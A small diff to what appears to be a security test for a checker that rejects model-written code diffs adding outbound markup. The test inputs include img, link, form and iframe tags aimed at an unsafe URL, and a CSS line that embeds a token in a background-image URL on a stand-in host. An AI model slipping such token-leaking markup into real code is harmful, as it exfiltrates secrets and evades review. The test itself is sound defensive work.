@@ -62,7 +62,7 @@ test('security rejects newly added outbound markup and CSS, including multiline 
     '+<img src={unsafeUrl} />',
     '+<a href={unsafeUrl}>Open</a>',
     '+<form action={unsafeUrl}>Send</form>',
-    '+<iframe\\n+ src={unsafeUrl} />',
+    '+<iframe\n+ src={unsafeUrl} />',
     '+const style = { backgroundImage: \`url(https://example.invalid/\${token})\` };'
   ]) {
     assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
